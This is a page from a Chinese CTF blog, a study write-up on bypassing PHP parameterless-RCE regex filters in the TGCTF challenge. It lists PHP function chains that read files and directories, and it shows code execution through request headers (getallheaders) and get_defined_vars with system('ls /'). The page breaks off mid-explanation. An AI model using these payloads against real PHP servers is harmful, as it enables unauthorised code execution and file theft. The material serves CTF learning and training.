@@ -1,0 +1,1306 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\n1 2 3 4 5 6 php &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){ eval($_GET[&#39;exp&#39;]); } ?&gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n">
+<title>TGCTF知识梳理</title>
+
+<link rel='canonical' href='https://Oight.github.io/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="TGCTF知识梳理">
+<meta property='og:description' content="Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\n1 2 3 4 5 6 php &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){ eval($_GET[&#39;exp&#39;]); } ?&gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n">
+<meta property='og:url' content='https://Oight.github.io/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/'>
+<meta property='og:site_name' content='Oight'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-01T10:32:07&#43;08:00'/><meta property='article:modified_time' content='2025-06-01T10:32:07&#43;08:00'/>
+<meta name="twitter:title" content="TGCTF知识梳理">
+<meta name="twitter:description" content="Web\r无参RCE/PHPSESSID绕过\r无参RCE\rTGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过\n经典的无参RCE像这样：\n1 2 3 4 5 6 php &lt;?php if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){ eval($_GET[&#39;exp&#39;]); } ?&gt; 正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Oight</a></h1>
+            <h2 class="site-description">talk is cheap, show me the code.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/696224138'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Oight'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#无参rcephpsessid绕过">无参RCE/PHPSESSID绕过</a>
+      <ol>
+        <li><a href="#无参rce">无参RCE</a>
+          <ol>
+            <li></li>
+            <li><a href="#1-参数传递"><strong>1. 参数传递</strong></a></li>
+            <li><a href="#2-执行"><strong>2. 执行 <code>eval($_GET['a'])</code></strong></a></li>
+            <li><a href="#3-内层"><strong>3. 内层 <code>eval</code> 的执行流程</strong></a></li>
+          </ol>
+        </li>
+        <li><a href="#phpsessid绕过">PHPSESSID绕过</a>
+          <ol>
+            <li></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#内存马pyramid-框架内存马">内存马，pyramid 框架内存马</a>
+      <ol>
+        <li><a href="#内存马">内存马</a>
+          <ol>
+            <li></li>
+          </ol>
+        </li>
+        <li><a href="#ssti类继承利用">SSTI，类继承利用</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%A4%8D%E7%8E%B0/" >
+                复现
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/tgctf%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/">TGCTF知识梳理</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-06-01</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 9 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="web">Web
+</h1><h2 id="无参rcephpsessid绕过">无参RCE/PHPSESSID绕过
+</h2><h3 id="无参rce">无参RCE
+</h3><p>TGCTF中并非是标准的无参RCE，但还是可以通过无参RCE来做，不过预期考点是PHPSESSID绕过</p>
+<p>经典的无参RCE像这样：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">    if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+((?R)?)/&#39;, NULL, $_GET[&#39;exp&#39;]){
+</span></span><span class="line"><span class="cl">            eval($_GET[&#39;exp&#39;]);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>正则表达式递归匹配函数中的参数，使我们无法传参，所以我们需要只使用函数来达到获取flag的目的</p>
+<p>无参RCE本质是程序中错误地使用了命令执行函数如 eval() 且采用了存在绕过隐患的黑名单匹配用户输入，考察的点是对PHP中函数特性的利用</p>
+<p>下面整理一些可以被利用的函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">getcwd() :取得当前工作目录
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dirname():函数返回路径中的目录部分
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">array_flip() :交换数组中的键和值，成功时返回交换后的数组
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">array_rand() :从数组中随机取出一个或多个单元
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">array_reverse():将数组内容反转
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">strrev():用于反转给定字符串
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">getcwd()：获取当前工作目录路径
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dirname() ：函数返回路径中的目录部分。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chdir() ：函数改变当前的目录。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">eval()、assert()：命令执行
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hightlight_file()、show_source()、readfile()：读取文件内容
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>比如：</p>
+<p>scandir(‘.’) 可以返回当前目录，但是正则匹配了我们的参数，导致我们无法传参。所以我们需要想办法构造一个” . “  ，这时候我们就可以利用 localeconv() ,因为它返回的第一个元素就是 “ . “ ( 关于为什么 localeconv()  返回的第一个元素是 . 可以看这里：<a class="link" href="https://www.runoob.com/php/func-string-localeconv.html"  target="_blank" rel="noopener"
+    >PHP localeconv() 函数</a> )</p>
+<p>这时候我们就可以得到一个查看当前目录文件的Payload：</p>
+<blockquote>
+<p>?参数=var_dump(scandir(current(localeconv())));</p></blockquote>
+<p>这里 current() 的作用是把 localeconv() 返回的点取出 （原理看这里：<a class="link" href="https://www.runoob.com/php/func-array-current.html"  target="_blank" rel="noopener"
+    >PHP current() 函数</a> ）</p>
+<p>根据flag文件的位置不同，我们可以搭配 next() 或 prev() 和 array_reverse() 一起使用</p>
+<p>比如：</p>
+<p>我们使用 <code>?参数=var_dump(scandir(current(localeconv())));</code> 看到当前目录是这样的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
+</span></span><span class="line"><span class="cl">array(3) {
+</span></span><span class="line"><span class="cl">    [0]=&gt;
+</span></span><span class="line"><span class="cl">    string(1) &#34;.&#34;
+</span></span><span class="line"><span class="cl">    [1]=&gt;
+</span></span><span class="line"><span class="cl">    string(2) &#34;..&#34;
+</span></span><span class="line"><span class="cl">    [2]=&gt;
+</span></span><span class="line"><span class="cl">    string(3) &#34;.git&#34;
+</span></span><span class="line"><span class="cl">    [3]=&gt;
+</span></span><span class="line"><span class="cl">    string(4) &#34;flag.php&#34;
+</span></span><span class="line"><span class="cl">    [4]=&gt;
+</span></span><span class="line"><span class="cl">    string(5) &#34;index.php&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们看到 flag.php 在倒数第二个，比较靠后的位置，这时候我们就可以用 array_reverse() 将数组内容反转，让它从倒数第二变成正数第二：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php
+</span></span><span class="line"><span class="cl">array(3) {
+</span></span><span class="line"><span class="cl">    [0]=&gt;
+</span></span><span class="line"><span class="cl">    string(5) &#34;index.php&#34;
+</span></span><span class="line"><span class="cl">    [1]=&gt;
+</span></span><span class="line"><span class="cl">    string(4) &#34;flag.php&#34;
+</span></span><span class="line"><span class="cl">    [2]=&gt;
+</span></span><span class="line"><span class="cl">    string(3) &#34;.git&#34;
+</span></span><span class="line"><span class="cl">    [3]=&gt;
+</span></span><span class="line"><span class="cl">    string(2) &#34;..&#34;
+</span></span><span class="line"><span class="cl">    [4]=&gt;
+</span></span><span class="line"><span class="cl">    string(1) &#34;.&#34;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后我们就可以使用 next() 使内部指针指向第二个元素（即flag.php）并将其输出，最后我们可以用 highlight_file() 返回文件内容</p>
+<p>相关的方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">end() - 将内部指针指向数组中的最后一个元素，并输出。
+</span></span><span class="line"><span class="cl">next() - 将内部指针指向数组中的下一个元素，并输出。
+</span></span><span class="line"><span class="cl">prev() - 将内部指针指向数组中的上一个元素，并输出。
+</span></span><span class="line"><span class="cl">reset() - 将内部指针指向数组中的第一个元素，并输出。
+</span></span><span class="line"><span class="cl">each() - 返回当前元素的键名和键值，并将内部指针向前移动。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>常见Payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件
+</span></span><span class="line"><span class="cl">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件
+</span></span><span class="line"><span class="cl">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件
+</span></span><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件
+</span></span><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件
+</span></span><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件
+</span></span><span class="line"><span class="cl">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>以上是如何读取flag ，接下来我们来看看如何命令执行：</p>
+<p>使用session_id() 来RCE的也算在这里面，但这个我们单拎出来放后面</p>
+<h5 id="getallheaders">getallheaders()
+</h5><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（ apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache ）</p>
+<p>当我们确定服务器使用Apache时，我们可以尝试使用 getallheaders() 函数来查看请求头信息，如果成功回显，我们就可以在请求头最后写入恶意代码，然后利用end() 来执行</p>
+<p>例如：我们写入 phpinfo();</p>
+<blockquote>
+<p>var_dump(end(getallheaders()));</p></blockquote>
+<p>end()指向最后一行的代码，达到phpinfo的目的，然后可以进一步去rce。</p>
+<h5 id="get_defined_vars">get_defined_vars()
+</h5><p>get_defined_vars() 函数返回由所有已定义变量所组成的数组。它可以回显全局变量 <code>$_GET、$_POST、$_FILES、$_COOKIE，</code></p>
+<p>返回数组顺序为<code>$_GET--&gt;$_POST--&gt;$_COOKIE--&gt;$_FILES</code></p>
+<p>同样首先确认是否有回显：</p>
+<blockquote>
+<p>print_r(get_defined_vars());</p></blockquote>
+<p>我们可以在后面拼接一个恶意代码：</p>
+<blockquote>
+<p>a=eval(end(current(get_defined_vars())));&amp;b=system(‘ls /‘);
+// a是原有的参数
+//把eval换成assert也行 ，能执行system(‘ls /‘)就行</p></blockquote>
+<p>执行逻辑：</p>
+<h4 id="1-参数传递"><strong>1. 参数传递</strong>
+</h4><p>用户发送的 GET 请求参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+</span></span><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="n">end</span><span class="p">(</span><span class="n">current</span><span class="p">(</span><span class="n">get_defined_vars</span><span class="p">())));</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls /&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>参数 <code>a</code> 的值为字符串 <code>eval(end(current(get_defined_vars())))</code>。</li>
+<li>参数 <code>b</code> 的值为字符串 <code>system('ls /')</code>。</li>
+</ul>
+<h4 id="2-执行"><strong>2. 执行 <code>eval($_GET['a'])</code></strong>
+</h4><p>PHP 脚本调用 <code>eval($_GET['a'])</code>，将参数 <code>a</code> 的值作为 PHP 代码执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="n">eval</span><span class="p">(</span><span class="s2">&#34;eval(end(current(get_defined_vars())));&#34;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3-内层"><strong>3. 内层 <code>eval</code> 的执行流程</strong>
+</h4><p>拆解内层 <code>eval</code> 的参数 <code>end(current(get_defined_vars()))</code>：</p>
+<ul>
+<li>
+<p><strong>步骤 3.1</strong>：<code>get_defined_vars()</code>
+返回当前作用域的所有已定义变量（包括超全局变量 <code>$_GET</code>、<code>$_SERVER</code> 等）。
+返回的数组结构类似：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="n">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;_GET&#39;</span> <span class="o">=&gt;</span> <span class="n">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;a&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;eval(end(current(get_defined_vars())))&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;b&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;system(</span><span class="se">\&#39;</span><span class="s1">ls /</span><span class="se">\&#39;</span><span class="s1">)&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="err">其他变量如</span> <span class="o">$</span><span class="n">_SERVER</span><span class="err">、</span><span class="o">$</span><span class="n">_POST</span> <span class="err">等</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="err">脚本中可能定义的其他变量</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p><strong>步骤 3.2</strong>：<code>current(get_defined_vars())</code>
+取 <code>get_defined_vars()</code> 返回数组的第一个元素的值。假设第一个元素是 <code>$_GET</code>，则返回 <code>$_GET</code> 数组：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
